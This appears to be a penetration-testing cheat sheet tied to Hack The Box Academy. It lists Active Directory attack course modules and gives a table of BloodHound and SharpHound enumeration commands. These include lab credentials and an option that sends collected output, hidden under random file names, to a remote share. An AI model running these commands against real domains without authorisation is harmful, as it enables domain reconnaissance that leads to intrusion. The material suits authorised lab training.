
|Name|Progress|Difficulty||   |
|---|---|---|---|---|
|[Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)||Medium|[View](https://academy.hackthebox.com/module/143)|
|[Active Directory LDAP](https://academy.hackthebox.com/module/details/22)||Medium|[Start](https://academy.hackthebox.com/module/22)|
|[Active Directory PowerView](https://academy.hackthebox.com/module/details/68)||Medium|Start|
|[Active Directory BloodHound](https://academy.hackthebox.com/module/details/69)||Medium|[Continue](https://academy.hackthebox.com/module/69)|
|[Windows Lateral Movement](https://academy.hackthebox.com/module/details/263)||Medium|Start|
|[Using CrackMapExec](https://academy.hackthebox.com/module/details/84)||Medium|Start|
|[Kerberos Attacks](https://academy.hackthebox.com/module/details/25)||Hard|Start|
|[DACL Attacks I](https://academy.hackthebox.com/module/details/219)||Hard|Start|
|[DACL Attacks II](https://academy.hackthebox.com/module/details/255)||Hard|Start|
|[NTLM Relay Attacks](https://academy.hackthebox.com/module/details/232)||Hard|Start|
|[ADCS Attacks](https://academy.hackthebox.com/module/details/236)||Hard|Start|
|[Active Directory Trust Attacks](https://academy.hackthebox.com/module/details/253)||Hard|Start|
|[Intro to C2 Operations with Sliver](https://academy.hackthebox.com/module/details/241)||Hard|Start|
|[Introduction to Windows Evasion Techniques](https://academy.hackthebox.com/module/details/254)||Hard|Start|
|[MSSQL, Exchange, and SCCM Attacks](https://academy.hackthebox.com/module/details/267)||Hard|Start|


# BloodHound

| Command                                                                                                                              | Description                                      |
| ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------ |
| `.\SharpHound.exe -c all --zipfilename inlanefreight_bloodhound`                                                                     | Run the SharpHound C# ingestor                   |
| `.\SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword HackTheBox --outputprefix HTB --randomfilenames`   | Randomize and hide SharpHound Output             |
| `Invoke-BloodHound -CollectionMethod all -ZipFileName ilfreight_bloodhound`                                                          | Run the SharpHound PowerShell ingestor           |
| `bloodhound-python -dc <DC> -gc <GC> -d <DOMAIN -c All -u <user>`                                                                    | Run bloodhound-python                            |
| `bloodhound-python -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -c All -dc dc01.vintage.htb`                                          |                                                  |
| `bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 -k`                                 |                                                  |
| `bloodhound-python -d inlanefreight.htb -c DCOnly -u htb-student -p HTBRocks! -ns 10.129.204.207 --kerberos`                         | Using BloodHound.py with Kerberos authentication |
| `runas /netonly /user:INLANEFREIGHT\htb-student cmd.exe`<br>`net view \\inlanefreight.htb\`<br>`SharpHound.exe -d inlanefreight.htb` | Running from Non-Domain-Joined Systems           |
